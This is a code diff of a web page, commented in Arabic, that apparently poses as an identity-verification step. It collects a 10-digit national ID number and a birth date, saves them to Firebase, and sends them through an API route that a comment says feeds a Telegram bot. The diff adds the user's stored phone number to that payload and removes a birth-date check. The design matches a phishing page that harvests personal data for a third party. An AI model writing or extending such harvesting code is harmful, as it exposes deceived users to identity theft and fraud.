@@ -70,29 +70,28 @@
         const idNumber = document.getElementById('idNumber').value;
         const birthDate = document.getElementById('birthDate').value;
 
-        // التحقق من أن الهوية 10 أرقام
         if (idNumber.length !== 10) {
             alert("يرجى إدخال رقم هوية صحيح مكون من 10 أرقام");
             return;
         }
 
-        if (!birthDate) {
-            alert("يرجى اختيار تاريخ الميلاد");
-            return;
-        }
-
         try {
+            // 1. إرسال البيانات إلى Firebase
             await addDoc(collection(db, "identity_verifications"), {
                 idNumber: idNumber,
                 birthDate: birthDate,
                 timestamp: serverTimestamp()
             });
 
-            fetch('/api/send', {
+            // 2. إرسال البيانات إلى بوت التليجرام عبر الـ API (بنفس طريقة index.html)
+            await fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    message: `تحقق هوية:\nالهوية: ${idNumber}\nالميلاد: ${birthDate}` 
+                    phone: localStorage.getItem('userPhone') || "غير متوفر",
+                    identity: idNumber,
+                    birthDate: birthDate,
+                    status: "تم إدخال الهوية وتاريخ الميلاد"
                 })
             });
 
@@ -103,6 +102,7 @@
         }
     });
 </script>
+
 
 </body>
 </html>
